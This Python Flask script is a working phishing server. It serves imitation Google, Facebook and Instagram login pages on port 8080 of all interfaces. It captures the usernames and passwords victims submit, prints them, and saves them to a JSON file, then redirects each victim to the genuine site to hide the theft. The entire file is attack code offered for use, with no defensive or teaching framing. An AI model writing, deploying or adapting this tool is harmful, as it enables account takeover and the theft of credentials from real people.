from flask import Flask, request, render_template, redirect
import os
import threading
import webbrowser
import json
from datetime import datetime

app = Flask(__name__)
app.config['TEMPLATES_AUTO_RELOAD'] = True

# Store captured credentials
captured_data = []

# Home page with site selection
@app.route('/')
def home():
    return render_template('index.html')

# Google phishing page
@app.route('/google', methods=['GET', 'POST'])
def google_phish():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('passwd')
        log_credentials('Google', email, password)
        return redirect('https://google.com')
    return render_template('google.html')

# Facebook phishing page
@app.route('/facebook', methods=['GET', 'POST'])
def facebook_phish():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('pass')
        log_credentials('Facebook', email, password)
        return redirect('https://facebook.com')
    return render_template('facebook.html')

# Instagram phishing page
@app.route('/instagram', methods=['GET', 'POST'])
def instagram_phish():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        log_credentials('Instagram', username, password)
        return redirect('https://instagram.com')
    return render_template('instagram.html')

def log_credentials(site, username, password):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = {
        'timestamp': timestamp,
        'site': site,
        'username': username,
        'password': password
    }
    captured_data.append(entry)
    print(f"[+] Captured credentials - Site: {site}, Username: {username}, Password: {password}")
    
    # Save to file
    with open('captured_credentials.json', 'w') as f:
        json.dump(captured_data, f, indent=4)

def start_server():
    app.run(host='0.0.0.0', port=8080)

if __name__ == '__main__':
    print("Starting phishing server...")
    print("Available phishing pages:")
    print("- http://localhost:8080/google")
    print("- http://localhost:8080/facebook")
    print("- http://localhost:8080/instagram")
    
    # Open browser automatically
    threading.Timer(1.5, lambda: webbrowser.open('http://localhost:8080')).start()
    
    start_server()